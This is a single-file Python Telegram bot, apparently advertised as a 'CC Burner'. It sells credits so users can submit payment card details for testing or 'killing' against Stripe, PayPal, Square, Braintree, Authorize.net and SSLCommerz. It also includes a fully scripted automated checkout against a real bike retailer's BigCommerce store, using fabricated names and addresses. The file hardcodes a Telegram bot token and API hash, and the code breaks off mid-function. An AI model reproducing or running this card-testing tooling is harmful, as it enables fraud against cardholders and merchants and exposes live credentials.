#!/usr/bin/env python3
"""
NOVA bot — single-file telegram killer bot
- credits, tiers, referrals
- 7 killers: stripe, paypal, square, braintree, authorize, sslcommerz, bikeattack
- pure python — stdlib + requests only

install:  pip install requests
run:      python bot.py
"""

import base64
import json
import os
import random
import re
import sqlite3
import string
import sys
import time
import traceback
import uuid
import xml.etree.ElementTree as ET
from datetime import datetime
from threading import Thread

import requests

# ═══════════════════════════════════════════════════════════════════════════
# CONFIG — edit everything here
# ═══════════════════════════════════════════════════════════════════════════

CONFIG = {
    "bot_name": "NOVA",
    "bot_tagline": "#1 CC Burner on Telegram ✅",

    "bot_token": os.environ.get("TG_TOKEN", "8959519162:AAHujZTeacMlNioh3LvqlvgWSSifHbg7oK4"),
    "admins": [int(x) for x in os.environ.get("TG_ADMINS", "8871910561").split(",") if x.strip()],

    # economy
    "start_credits": 10,
    "kill_cost": 5,
    "check_cost": 1,
    "tool_cost": 0,
    "admin_free": True,
    "premium_free": False,
    "cooldown_sec": 20,

    # referrals
    "ref_enabled": True,
    "ref_referrer_bonus": 5,
    "ref_referee_bonus": 0,

    # db
    "db_path": os.path.join(os.path.dirname(os.path.abspath(__file__)), "nova.db"),

    # telegram client (unused for bot, kept for reference)
    "tg_api_id": 33657928,
    "tg_api_hash": "a61fde61442113b9a65c699f7020d59a",

    # ─── gateway credentials — fill what you have ───────────────────────────
    "gateways": {
        "stripe": {
            "key": os.environ.get("STRIPE_KEY", ""),
        },
        "paypal": {
            "client_id": os.environ.get("PAYPAL_CLIENT_ID", ""),
            "secret": os.environ.get("PAYPAL_SECRET", ""),
            "sandbox": os.environ.get("PAYPAL_SANDBOX", "true").lower() == "true",
        },
        "square": {
            "access_token": os.environ.get("SQUARE_ACCESS_TOKEN", ""),
            "location_id": os.environ.get("SQUARE_LOCATION_ID", ""),
            "sandbox": os.environ.get("SQUARE_SANDBOX", "true").lower() == "true",
        },
        "braintree": {
            "public_key": os.environ.get("BRAINTREE_PUBLIC_KEY", ""),
            "private_key": os.environ.get("BRAINTREE_PRIVATE_KEY", ""),
            "sandbox": os.environ.get("BRAINTREE_SANDBOX", "true").lower() == "true",
        },
        "authorize": {
            "api_login_id": os.environ.get("AUTHORIZE_API_LOGIN_ID", ""),
            "transaction_key": os.environ.get("AUTHORIZE_TRANSACTION_KEY", ""),
            "sandbox": os.environ.get("AUTHORIZE_SANDBOX", "true").lower() == "true",
        },
        "sslcommerz": {
            "store_id": os.environ.get("SSLCOMMERZ_STORE_ID", ""),
            "store_passwd": os.environ.get("SSLCOMMERZ_STORE_PASSWD", ""),
            "sandbox": os.environ.get("SSLCOMMERZ_SANDBOX", "true").lower() == "true",
        },
        "bikeattack": {},
    },
}

TG_API = f"https://api.telegram.org/bot{CONFIG['bot_token']}"

# ═══════════════════════════════════════════════════════════════════════════
# LOG
# ═══════════════════════════════════════════════════════════════════════════

def log(msg, level="info"):
    ts = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
    colors = {"info": "\033[96m", "warn": "\033[93m", "error": "\033[91m", "debug": "\033[95m"}
    c = colors.get(level, "\033[97m")
    print(f"\033[92m{ts}\033[0m\t{c}[{level.upper()}]\033[0m\t{msg}", flush=True)


# ═══════════════════════════════════════════════════════════════════════════
# DB
# ═══════════════════════════════════════════════════════════════════════════

_db = None

def db_init():
    global _db
    _db = sqlite3.connect(CONFIG["db_path"], check_same_thread=False)
    _db.row_factory = sqlite3.Row
    _db.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            credits INTEGER NOT NULL DEFAULT 0,
            tier TEXT NOT NULL DEFAULT 'free',
            referral_code TEXT,
            referred_by INTEGER,
            referral_count INTEGER NOT NULL DEFAULT 0,
            referral_credits_earned INTEGER NOT NULL DEFAULT 0,
            total_kills INTEGER NOT NULL DEFAULT 0,
            total_credits_spent INTEGER NOT NULL DEFAULT 0,
            created_at INTEGER NOT NULL,
            last_seen INTEGER NOT NULL
        );
        CREATE TABLE IF NOT EXISTS kills (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            command TEXT NOT NULL,
            gateway TEXT NOT NULL,
            card TEXT NOT NULL,
            zip TEXT NOT NULL,
            status TEXT NOT NULL,
            attempts INTEGER,
            duration REAL,
            raw TEXT,
            created_at INTEGER NOT NULL
        );
        CREATE TABLE IF NOT EXISTS credit_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            delta INTEGER NOT NULL,
            reason TEXT,
            actor_id INTEGER,
            created_at INTEGER NOT NULL
        );
        CREATE TABLE IF NOT EXISTS media (
            key TEXT PRIMARY KEY,
            file_id TEXT NOT NULL,
            updated_at INTEGER NOT NULL
        );
        CREATE INDEX IF NOT EXISTS idx_kills_user ON kills(user_id);
        CREATE INDEX IF NOT EXISTS idx_credit_log_user ON credit_log(user_id);
    """)
    cols = [r["name"] for r in _db.execute("PRAGMA table_info(users)").fetchall()]
    for col, decl in [
        ("referral_code", "TEXT"),
        ("referred_by", "INTEGER"),
        ("referral_count", "INTEGER NOT NULL DEFAULT 0"),
        ("referral_credits_earned", "INTEGER NOT NULL DEFAULT 0"),
        ("tier", "TEXT NOT NULL DEFAULT 'free'"),
    ]:
        if col not in cols:
            _db.execute(f"ALTER TABLE users ADD COLUMN {col} {decl}")
    _db.execute("CREATE UNIQUE INDEX IF NOT EXISTS idx_users_refcode ON users(referral_code) WHERE referral_code IS NOT NULL")
    _db.commit()
    log(f"db ready at {CONFIG['db_path']}")


def _gen_ref_code(user_id):
    for _ in range(12):
        seed = f"{user_id}-{time.time()}-{random.random()}"
        code = base64.b16encode(uuid.uuid5(uuid.NAMESPACE_DNS, seed).bytes).decode().lower()[:8]
        r = _db.execute("SELECT 1 FROM users WHERE referral_code=?", (code,)).fetchone()
        if not r:
            return code
    return f"u{user_id:x}"[:12]


def ensure_user(tg_user):
    now = int(time.time() * 1000)
    row = _db.execute("SELECT * FROM users WHERE id=?", (tg_user["id"],)).fetchone()
    if not row:
        code = _gen_ref_code(tg_user["id"])
        _db.execute(
            "INSERT INTO users (id, username, first_name, credits, tier, referral_code, created_at, last_seen) VALUES (?,?,?,?,?,?,?,?)",
            (tg_user["id"], tg_user.get("username"), tg_user.get("first_name"),
             CONFIG["start_credits"], "free", code, now, now)
        )
        _db.execute(
            "INSERT INTO credit_log (user_id, delta, reason, actor_id, created_at) VALUES (?,?,?,?,?)",
            (tg_user["id"], 0, "welcome_bonus", None, now)
        )
        _db.commit()
    else:
        _db.execute("UPDATE users SET username=?, first_name=?, last_seen=? WHERE id=?",
                    (tg_user.get("username"), tg_user.get("first_name"), now, tg_user["id"]))
        if not row["referral_code"]:
            _db.execute("UPDATE users SET referral_code=? WHERE id=?", (_gen_ref_code(tg_user["id"]), tg_user["id"]))
        _db.commit()
    return _db.execute("SELECT * FROM users WHERE id=?", (tg_user["id"],)).fetchone()


def get_user(uid):
    return _db.execute("SELECT * FROM users WHERE id=?", (uid,)).fetchone()


def get_user_by_username(u):
    if not u:
        return None
    clean = u.lstrip("@")
    return _db.execute("SELECT * FROM users WHERE LOWER(username)=LOWER(?)", (clean,)).fetchone()


def get_user_by_ref_code(code):
    return _db.execute("SELECT * FROM users WHERE referral_code=?", (code,)).fetchone()


def add_credit(uid, delta, reason, actor_id=None):
    now = int(time.time() * 1000)
    if delta != 0:
        _db.execute("UPDATE users SET credits=credits+? WHERE id=?", (delta, uid))
    _db.execute(
        "INSERT INTO credit_log (user_id, delta, reason, actor_id, created_at) VALUES (?,?,?,?,?)",
        (uid, delta, reason, actor_id, now)
    )
    _db.commit()
    return get_user(uid)


def spend_credit(uid, amount, reason):
    u = get_user(uid)
    if not u:
        return {"ok": False, "error": "user not found"}
    if u["credits"] < amount:
        return {"ok": False, "error": "insufficient"}
    now = int(time.time() * 1000)
    _db.execute("UPDATE users SET credits=credits-?, total_credits_spent=total_credits_spent+? WHERE id=?",
                (amount, amount, uid))
    _db.execute(
        "INSERT INTO credit_log (user_id, delta, reason, actor_id, created_at) VALUES (?,?,?,?,?)",
        (uid, -amount, reason, None, now)
    )
    _db.commit()
    return {"ok": True, "user": get_user(uid)}


def set_tier(uid, tier):
    _db.execute("UPDATE users SET tier=? WHERE id=?", (tier, uid))
    _db.commit()
    return get_user(uid)


def apply_referral(new_uid, code):
    if not CONFIG["ref_enabled"]:
        return {"ok": False, "reason": "disabled"}
    if not code:
        return {"ok": False, "reason": "no_code"}
    referee = get_user(new_uid)
    if not referee:
        return {"ok": False, "reason": "missing"}
    if referee["referred_by"]:
        return {"ok": False, "reason": "already_referred"}
    referrer = get_user_by_ref_code(code)
    if not referrer:
        return {"ok": False, "reason": "bad_code"}
    if referrer["id"] == new_uid:
        return {"ok": False, "reason": "self_referral"}

    now = int(time.time() * 1000)
    bonus = CONFIG["ref_referrer_bonus"]
    ref_bonus = CONFIG["ref_referee_bonus"]

    _db.execute("UPDATE users SET referred_by=? WHERE id=?", (referrer["id"], new_uid))
    _db.execute(
        "UPDATE users SET referral_count=referral_count+1, referral_credits_earned=referral_credits_earned+? WHERE id=?",
        (bonus, referrer["id"])
    )
    if bonus > 0:
        _db.execute("UPDATE users SET credits=credits+? WHERE id=?", (bonus, referrer["id"]))
        _db.execute(
            "INSERT INTO credit_log (user_id, delta, reason, actor_id, created_at) VALUES (?,?,?,?,?)",
            (referrer["id"], bonus, f"referral_bonus:{new_uid}", new_uid, now)
        )
    if ref_bonus > 0:
        _db.execute("UPDATE users SET credits=credits+? WHERE id=?", (ref_bonus, new_uid))
        _db.execute(
            "INSERT INTO credit_log (user_id, delta, reason, actor_id, created_at) VALUES (?,?,?,?,?)",
            (new_uid, ref_bonus, f"referee_bonus:{referrer['id']}", referrer["id"], now)
        )
    _db.commit()
    return {"ok": True, "referrer": get_user(referrer["id"]), "referee": get_user(new_uid)}


def log_kill(entry):
    _db.execute(
        "INSERT INTO kills (user_id, command, gateway, card, zip, status, attempts, duration, raw, created_at) VALUES (?,?,?,?,?,?,?,?,?,?)",
        (entry["user_id"], entry["command"], entry["gateway"], entry["card"], entry["zip"],
         entry["status"], entry.get("attempts", 0), entry.get("duration", 0),
         (entry.get("raw") or "")[:400], int(time.time() * 1000))
    )
    if entry["status"] in ("approved", "declined"):
        _db.execute("UPDATE users SET total_kills=total_kills+1 WHERE id=?", (entry["user_id"],))
    _db.commit()


def user_history(uid, limit=10):
    return _db.execute("SELECT * FROM kills WHERE user_id=? ORDER BY id DESC LIMIT ?", (uid, limit)).fetchall()


def credit_history(uid, limit=10):
    return _db.execute("SELECT * FROM credit_log WHERE user_id=? ORDER BY id DESC LIMIT ?", (uid, limit)).fetchall()


def all_users(limit=20, offset=0):
    return _db.execute("SELECT * FROM users ORDER BY last_seen DESC LIMIT ? OFFSET ?", (limit, offset)).fetchall()


def top_users(limit=10):
    return _db.execute("SELECT * FROM users ORDER BY total_kills DESC LIMIT ?", (limit,)).fetchall()


def ref_leaderboard(limit=10):
    return _db.execute(
        "SELECT * FROM users WHERE referral_count>0 ORDER BY referral_count DESC, referral_credits_earned DESC LIMIT ?",
        (limit,)
    ).fetchall()


def ref_list(uid, limit=20):
    return _db.execute("SELECT * FROM users WHERE referred_by=? ORDER BY created_at DESC LIMIT ?", (uid, limit)).fetchall()


def global_stats():
    u = _db.execute("SELECT COUNT(*) c FROM users").fetchone()["c"]
    k = _db.execute("SELECT COUNT(*) c FROM kills").fetchone()["c"]
    ap = _db.execute("SELECT COUNT(*) c FROM kills WHERE status='approved'").fetchone()["c"]
    dc = _db.execute("SELECT COUNT(*) c FROM kills WHERE status='declined'").fetchone()["c"]
    sp = _db.execute("SELECT COALESCE(SUM(-delta),0) s FROM credit_log WHERE delta<0").fetchone()["s"]
    co = _db.execute("SELECT COALESCE(SUM(credits),0) s FROM users").fetchone()["s"]
    pr = _db.execute("SELECT COUNT(*) c FROM users WHERE tier='premium'").fetchone()["c"]
    return {"users": u, "kills": k, "approved": ap, "declined": dc, "spent": sp, "outstanding": co, "premium": pr}


def gateway_stats():
    return _db.execute("""
        SELECT gateway, COUNT(*) total,
               SUM(CASE WHEN status='approved' THEN 1 ELSE 0 END) approved,
               SUM(CASE WHEN status='declined' THEN 1 ELSE 0 END) declined
        FROM kills GROUP BY gateway ORDER BY total DESC
    """).fetchall()


def get_media(key):
    r = _db.execute("SELECT file_id FROM media WHERE key=?", (key,)).fetchone()
    return r["file_id"] if r else None


def set_media(key, file_id):
    now = int(time.time() * 1000)
    _db.execute("""
        INSERT INTO media (key, file_id, updated_at) VALUES (?,?,?)
        ON CONFLICT(key) DO UPDATE SET file_id=excluded.file_id, updated_at=excluded.updated_at
    """, (key, file_id, now))
    _db.commit()


# ═══════════════════════════════════════════════════════════════════════════
# CC PARSING
# ═══════════════════════════════════════════════════════════════════════════

AUTO_ZIPS = [
    "10001", "90210", "60601", "02108", "33101",
    "98101", "78701", "30301", "19103", "85001",
    "80202", "37201", "42749", "44101", "55401",
    "63101", "70112", "89101", "97201", "21201",
]


def parse_cc(s):
    if not s:
        return None
    s = re.sub(r"\s+", "", str(s))
    parts = s.split("|")
    if len(parts) == 3:
        num, exp, cvv = parts
        if "/" in exp:
            mm, yy = exp.split("/", 1)
            parts = [num, mm, yy, cvv]
    if len(parts) != 4:
        return None
    num, mm, yy, cvv = [p.strip() for p in parts]
    if len(yy) == 4:
        yy = yy[2:]
    if not (num.isdigit() and 12 <= len(num) <= 19):
        return None
    if not mm.isdigit():
        return None
    return {"number": num, "mm": mm.zfill(2), "yy": yy.zfill(2), "cvv": cvv}


def fake_creds(real):
    return {
        "cvv": str(random.randint(100, 999)),
        "zip": str(random.randint(10000, 99999)),
        "mm": str(random.randint(1, 12)).zfill(2),
        "yy": str(random.randint(25, 30)),
    }


def has_creds(gateway):
    g = CONFIG["gateways"].get(gateway, {})
    if not g:
        return True
    for k, v in g.items():
        if k == "sandbox":
            continue
        if not v or (isinstance(v, str) and ("YOUR_" in v or "your_" in v or "x" * 8 in v)):
            return False
    return True


# ═══════════════════════════════════════════════════════════════════════════
# GATEWAY KILLERS
# ═══════════════════════════════════════════════════════════════════════════

def stripe_charge(num, mm, yy, cvv, zip_code):
    key = CONFIG["gateways"]["stripe"]["key"]
    try:
        r = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            headers={"Authorization": f"Bearer {key}"},
            data={
                "type": "card",
                "card[number]": num,
                "card[exp_month]": mm,
                "card[exp_year]": yy,
                "card[cvc]": cvv,
                "billing_details[address][postal_code]": zip_code,
            },
            timeout=12,
        )
        j = r.json()
        if r.status_code == 200 and "id" in j:
            return "approved", j.get("id", "")
        err = j.get("error", {})
        return "declined", (err.get("code") or err.get("message", ""))[:200]
    except requests.Timeout:
        return "timeout", "request timeout"
    except Exception as e:
        return "error", str(e)[:200]


def paypal_charge(num, mm, yy, cvv, zip_code):
    g = CONFIG["gateways"]["paypal"]
    base = "https://api-m.sandbox.paypal.com" if g["sandbox"] else "https://api-m.paypal.com"
    try:
        auth = base64.b64encode(f"{g['client_id']}:{g['secret']}".encode()).decode()
        tr = requests.post(
            f"{base}/v1/oauth2/token",
            headers={"Authorization": f"Basic {auth}", "Content-Type": "application/x-www-form-urlencoded"},
            data={"grant_type": "client_credentials"},
            timeout=12,
        )
        token = tr.json().get("access_token", "")
        if not token:
            return "error", "token fetch failed"
        r = requests.post(
            f"{base}/v1/vault/credit-cards",
            headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
            json={
                "number": num, "type": "visa",
                "expire_month": int(mm), "expire_year": int("20" + yy),
                "cvv2": cvv, "first_name": "Test", "last_name": "User",
                "billing_address": {"line1": "1 Main St", "city": "San Jose", "state": "CA",
                                    "postal_code": zip_code, "country_code": "US"},
            },
            timeout=12,
        )
        j = r.json()
        if r.status_code in (200, 201) and "id" in j:
            return "approved", j.get("id", "")
        if "error" in j or "name" in j:
            return "declined", (j.get("message") or j.get("name") or "")[:200]
        return "error", str(j)[:200]
    except requests.Timeout:
        return "timeout", "request timeout"
    except Exception as e:
        return "error", str(e)[:200]


def square_charge(num, mm, yy, cvv, zip_code):
    g = CONFIG["gateways"]["square"]
    base = "https://connect.squareupsandbox.com" if g["sandbox"] else "https://connect.squareup.com"
    try:
        payload = {
            "idempotency_key": str(uuid.uuid4()),
            "autocomplete": False,
            "amount_money": {"amount": 100, "currency": "USD"},
            "source_id": "cnon:card-nonce-ok",
            "card_details": {"card": {"number": num, "exp_month": int(mm), "exp_year": int("20" + yy),
                                      "cvv": cvv, "postal_code": zip_code}},
            "location_id": g["location_id"],
        }
        r = requests.post(
            f"{base}/v2/payments",
            headers={"Authorization": f"Bearer {g['access_token']}", "Content-Type": "application/json",
                     "Square-Version": "2024-06-04"},
            json=payload, timeout=12,
        )
        j = r.json()
        if "payment" in j:
            return "approved", j["payment"].get("id", "")
        if "errors" in j:
            return "declined", (j["errors"][0].get("code") or "")[:200]
        return "error", str(j)[:200]
    except requests.Timeout:
        return "timeout", "request timeout"
    except Exception as e:
        return "error", str(e)[:200]


def braintree_charge(num, mm, yy, cvv, zip_code):
    g = CONFIG["gateways"]["braintree"]
    base = "https://payments.sandbox.braintree-api.com/graphql" if g["sandbox"] else "https://payments.braintree-api.com/graphql"
    auth = base64.b64encode(f"{g['public_key']}:{g['private_key']}".encode()).decode()
    try:
        query = """
        mutation Tokenize($input: TokenizeCreditCardInput!) {
          tokenizeCreditCard(input: $input) { paymentMethod { id } }
        }
        """
        variables = {"input": {"creditCard": {
            "number": num, "expirationMonth": mm,
            "expirationYear": ("20" + yy) if len(yy) == 2 else yy,
            "cvv": cvv, "billingAddress": {"postalCode": zip_code},
        }}}
        r = requests.post(
            base,
            headers={"Authorization": f"Basic {auth}", "Braintree-Version": "2019-01-01",
                     "Content-Type": "application/json"},
            json={"query": query, "variables": variables},
            timeout=12,
        )
        j = r.json()
        if "errors" in j and j["errors"]:
            msg = j["errors"][0].get("message", "")[:200]
            if any(k in msg.lower() for k in ["cvv", "declined", "expired", "invalid", "failed"]):
                return "declined", msg
            return "error", msg
        data = (j.get("data") or {}).get("tokenizeCreditCard") or {}
        pm = data.get("paymentMethod") or {}
        if pm.get("id"):
            return "approved", pm["id"]
        return "error", str(j)[:200]
    except requests.Timeout:
        return "timeout", "request timeout"
    except Exception as e:
        return "error", str(e)[:200]


def authorize_charge(num, mm, yy, cvv, zip_code):
    g = CONFIG["gateways"]["authorize"]
    url = ("https://apitest.authorize.net/xml/v1/request.api"
           if g["sandbox"] else "https://api.authorize.net/xml/v1/request.api")
    body = f"""<?xml version="1.0" encoding="utf-8"?>
<createTransactionRequest xmlns="AnetApi/xml/v1/schema/AnetApiSchema.xsd">
  <merchantAuthentication>
    <name>{g['api_login_id']}</name>
    <transactionKey>{g['transaction_key']}</transactionKey>
  </merchantAuthentication>
  <transactionRequest>
    <transactionType>authCaptureTransaction</transactionType>
    <amount>1.00</amount>
    <payment>
      <creditCard>
        <cardNumber>{num}</cardNumber>
        <expirationDate>{mm}/{yy}</expirationDate>
        <cardCode>{cvv}</cardCode>
      </creditCard>
    </payment>
    <billTo><zip>{zip_code}</zip></billTo>
  </transactionRequest>
</createTransactionRequest>
"""
    try:
        r = requests.post(url, data=body.encode("utf-8"),
                          headers={"Content-Type": "application/xml"}, timeout=12)
        clean = re.sub(r'\sxmlns(:\w+)?="[^"]+"', "", r.text)
        root = ET.fromstring(clean)
        rc = root.find(".//messages/resultCode")
        code_el = root.find(".//messages/message/code")
        text_el = root.find(".//messages/message/text")
        direct = root.find(".//directResponse")
        rc = (rc.text or "").lower() if rc is not None else ""
        mc = (code_el.text or "") if code_el is not None else ""
        mt = (text_el.text or "") if text_el is not None else ""
        dv = direct.text if direct is not None else ""
        if rc == "ok" and ",1," in f",{dv},":
            return "approved", dv or "ok"
        if rc == "ok" and ",2," in f",{dv},":
            return "declined", dv
        if "approved" in mt.lower():
            return "approved", mt
        if rc == "ok":
            return "approved", dv or mt or "ok"
        return ("declined" if mt else "error"), f"{mc}:{mt}"[:200]
    except requests.Timeout:
        return "timeout", "request timeout"
    except ET.ParseError as e:
        return "error", f"xml parse: {e}"
    except Exception as e:
        return "error", str(e)[:200]


def sslcommerz_charge(num, mm, yy, cvv, zip_code):
    g = CONFIG["gateways"]["sslcommerz"]
    url = ("https://sandbox.sslcommerz.com/gwprocess/v4/api.php"
           if g["sandbox"] else "https://securepay.sslcommerz.com/gwprocess/v4/api.php")
    payload = {
        "store_id": g["store_id"], "store_passwd": g["store_passwd"],
        "total_amount": "1", "currency": "BDT",
        "tran_id": f"TX{random.randint(100000, 999999)}",
        "success_url": "https://example.com/success",
        "fail_url": "https://example.com/fail",
        "cancel_url": "https://example.com/cancel",
        "emi_option": "0", "cus_name": "Test User", "cus_email": "test@example.com",
        "cus_add1": "1 Test Address", "cus_city": "Dhaka", "cus_state": "Dhaka",
        "cus_postcode": zip_code, "cus_country": "Bangladesh", "cus_phone": "01711111111",
        "shipping_method": "NO", "product_name": "Test", "product_category": "Test",
        "product_profile": "general",
        "card_number": num, "card_expiry": f"{mm}/{yy}", "card_cvc": cvv,
    }
    try:
        r = requests.post(url, data=payload, timeout=12)
        j = r.json()
        s = (j.get("status") or "").upper()
        if s == "SUCCESS":
            return "approved", j.get("sessionkey", "")
        if s in ("FAILED", "INVALID_TRANSACTION", "CANCELED"):
            return "declined", (j.get("failedreason") or s)[:200]
        return "error", str(j)[:200]
    except requests.Timeout:
        return "timeout", "request timeout"
    except Exception as e:
        return "error", str(e)[:200]


# ─── bikeattack / bigcommerce flow ───────────────────────────────────────

BA_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
         "(KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36")
BA_TIMEOUT = 25
BA_AVS = [
    ("10001", "New York", "New York", "NY"),
    ("90210", "Beverly Hills", "California", "CA"),
    ("60601", "Chicago", "Illinois", "IL"),
    ("02108", "Boston", "Massachusetts", "MA"),
    ("33101", "Miami", "Florida", "FL"),
    ("98101", "Seattle", "Washington", "WA"),
    ("78701", "Austin", "Texas", "TX"),
    ("30301", "Atlanta", "Georgia", "GA"),
    ("19103", "Philadelphia", "Pennsylvania", "PA"),
    ("85001", "Phoenix", "Arizona", "AZ"),
    ("80202", "Denver", "Colorado", "CO"),
    ("37201", "Nashville", "Tennessee", "TN"),
    ("42749", "Horse Cave", "Kentucky", "KY"),
    ("44101", "Cleveland", "Ohio", "OH"),
    ("55401", "Minneapolis", "Minnesota", "MN"),
    ("63101", "St. Louis", "Missouri", "MO"),
    ("70112", "New Orleans", "Louisiana", "LA"),
    ("89101", "Las Vegas", "Nevada", "NV"),
    ("97201", "Portland", "Oregon", "OR"),
    ("21201", "Baltimore", "Maryland", "MD"),
]


def _bstr(n=10):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def _baddr():
    z, city, state, code = random.choice(BA_AVS)
    return {
        "first": "Richard", "last": "Biven",
        "addr1": f"{random.randint(100,999)} Lee Circle",
        "addr2": f"Apt {random.randint(1,40)}",
        "city": city, "state": state, "state_code": code,
        "country": "United States", "country_code": "US",
        "zip": z,
        "phone": "0" + str(random.randint(100000000, 999999999)),
        "email": f"{_bstr(8)}@{_bstr(5)}.com",
    }


def bikeattack_charge(num, mm, yy, cvv, zip_code):
    s = requests.Session()
    s.headers["User-Agent"] = BA_UA
    try:
        s.get("https://bikeattack.com/", timeout=BA_TIMEOUT)

        boundary = "----WebKitFormBoundary" + _bstr(16)
        body = (
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nadd\r\n"
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"product_id\"\r\n\r\n5074\r\n"
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"attribute[21013]\"\r\n\r\n525\r\n"
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"qty[]\"\r\n\r\n1\r\n"
            f"--{boundary}--\r\n"
        )
        cart_headers = {
            "accept": "*/*",
            "content-type": f"multipart/form-data; boundary={boundary}",
            "origin": "https://bikeattack.com",
            "referer": "https://bikeattack.com/scott-voltage-eride-900-tuned-20mph-2025/",
            "x-requested-with": "stencil-utils",
        }
        csrf = next((c.value for c in s.cookies if c.name == "SF-CSRF-TOKEN"), None)
        xsrf = next((c.value for c in s.cookies if c.name == "XSRF-TOKEN"), None)
        if csrf:
            cart_headers["x-sf-csrf-token"] = csrf
        if xsrf:
            cart_headers["x-xsrf-token"] = xsrf

        r = s.post("https://bikeattack.com/remote/v1/cart/add",
                   data=body.encode(), headers=cart_headers, timeout=BA_TIMEOUT)
        cart_id = None
        try:
            j = r.json()
            cart_id = j.get("data", {}).get("cart_id")
        except Exception:
            pass
        if not cart_id:
            return "error", "no cart id"

        s.get("https://bikeattack.com/checkout", timeout=BA_TIMEOUT)

        csrf = next((c.value for c in s.cookies if c.name == "SF-CSRF-TOKEN"), csrf)
        xsrf = next((c.value for c in s.cookies if c.name == "XSRF-TOKEN"), xsrf)

        def json_headers():
            h = {
                "accept": "application/vnd.bc.v1+json",
                "content-type": "application/json",
                "origin": "https://bikeattack.com",
                "referer": "https://bikeattack.com/checkout",
                "x-checkout-sdk-version": "1.726.0",
            }
            if csrf:
                h["x-sf-csrf-token"] = csrf
            if xsrf:
                h["x-xsrf-token"] = xsrf
            return h

        br = s.post(
            f"https://bikeattack.com/api/storefront/checkouts/{cart_id}/billing-address"
            "?include=cart.lineItems.physicalItems.options%2Ccart.lineItems.digitalItems.options%2Ccustomer",
            headers=json_headers(),
            json={"email": _bstr(8) + "@" + _bstr(5) + ".com",
                  "acceptsMarketingNewsletter": True, "acceptsAbandonedCartEmails": True},
            timeout=BA_TIMEOUT,
        )
        billing_id = None
        try:
            billing_id = br.json().get("id")
        except Exception:
            pass
        if not billing_id:
            return "error", "no billing id"

        a = _baddr()
        s.put(
            f"https://bikeattack.com/api/storefront/checkouts/{cart_id}/billing-address/{billing_id}"
            "?include=cart.lineItems.physicalItems.options%2Ccart.lineItems.digitalItems.options%2Ccustomer",
            headers=json_headers(),
            json={
                "countryCode": a["country_code"],
                "firstName": a["first"], "lastName": a["last"],
                "address1": a["addr1"], "address2": a["addr2"],
                "company": "Developer", "city": a["city"],
                "stateOrProvince": a["state"], "stateOrProvinceCode": a["state_code"],
                "postalCode": a["zip"], "phone": a["phone"],
                "shouldSaveAddress": True, "email": a["email"], "customFields": [],
            },
            timeout=BA_TIMEOUT,
        )

        s.put(
            f"https://bikeattack.com/api/storefront/checkout/{cart_id}"
            "?include=cart.lineItems.physicalItems.options%2Ccart.lineItems.digitalItems.options%2Ccustomer%2Cpayments",
            headers=json_headers(),
            json={"customerMessage": "auto"},
            timeout=BA_TIMEOUT,
        )

        orr = s.post(
            "https://bikeattack.com/internalapi/v1/checkout/order",
            headers=json_headers(),
            json={"cartId": cart_id, "customerMessage": "auto"},
            timeout=BA_TIMEOUT,
        )
        order_id = None
        jwt = None
        try:
            oj = orr.json()
            order_id = oj.get("data", {}).get("order", {}).get("id")
            jwt = oj.get("data", {}).get("payment", {}).get("token")
        except Exception:
            pass
        if not jwt:
            return "error", "no payment token"
        if not order_id:
            order_id = random.randint(10000, 99999)

        a = _baddr()
        notify = f"https://internalapi-852183.mybigcommerce.com/internalapi/v1/checkout/order/{order_id}/payment"
        payload = {
            "customer": {"geo_ip_country_code": "US", "session_token": _bstr(40)},
            "notify_url": notify,
            "order": {
                "billing_address": {
                    "city": a["city"], "company": "Developer", "country_code": a["country_code"],
                    "country": a["country"], "first_name": a["first"], "last_name": a["last"],
                    "phone": a["phone"], "state_code": a["state_code"], "state": a["state"],
                    "street_1": a["addr1"], "street_2": a["addr2"], "zip": a["zip"], "email": a["email"],
                },
                "coupons": [], "currency": "USD", "id": order_id,
                "items": [{
                    "code": _bstr(36), "variant_id": 3533,
                    "name": "Scott: Voltage eRIDE 900 Tuned 20mph 2025",
                    "price": 1099999, "unit_price": 1099999, "quantity": 1, "sku": "293290",
                }],
                "shipping": [{"method": "Fixed Shipping"}],
                "shipping_address": {
                    "city": a["city"], "company": "Developer", "country_code": a["country_code"],
                    "country": a["country"], "first_name": a["first"], "last_name": a["last"],
                    "phone": a["phone"], "state_code": a["state_code"], "state": a["state"],
                    "street_1": a["addr1"], "street_2": a["addr2"], "zip": a["zip"],
                },
                "token": _bstr(32),
                "totals": {"grand_total": 1109999, "handling": 0, "shipping": 10000,
                           "subtotal": 1099999, "tax": 0},
            },
            "payment": {
                "gateway": "authorizenet", "notify_url": notify,
                "vault_payment_instrument": False, "method": "credit-card",
                "credit_card": {
                    "account_name": f"{a['first']} {a['last']}",
                    "month": int(mm), "number": num,
                    "verification_value": cvv, "year": int("20" + yy),
                },
            },
            "store": {"hash": "44ck0", "id": "852183", "name": "Bike Attack"},
        }
        pay_headers = {
            "accept": "application/json",
            "authorization": "JWT " + jwt,
            "content-type": "application/json",
            "origin": "https://bikeattack.com",
            "referer": "https://bikeattack.com/",
        }
        pr = s.post("https://payments.bigcommerce.com/api/public/v1/orders/payments",
                    headers=pay_headers, json=payload, timeout=BA_TIMEOUT)
        try:
            pj = pr.json()
        except Exception:
            pj = None
        if isinstance(pj, dict):
            errs = pj.get("errors")
            if isinstance(errs, list) and errs:
                f = errs[0] or {}
                if f.get("code") == "transaction_declined":
                    return "declined", "transaction_declined"
                msg = str(f.get("message", ""))[:200]
                if any(k in msg.lower() for k in ["declin", "denied", "insufficient"]):
                    return "declined", msg
                return "error", msg
            if pj.get("status") == "ok":
                return "approved", "ok"
        if 200 <= pr.status_code < 300:
            return "approved", f"http {pr.status_code}"
        if 400 <= pr.status_code < 500:
            return "declined", f"http {pr.status_code}"
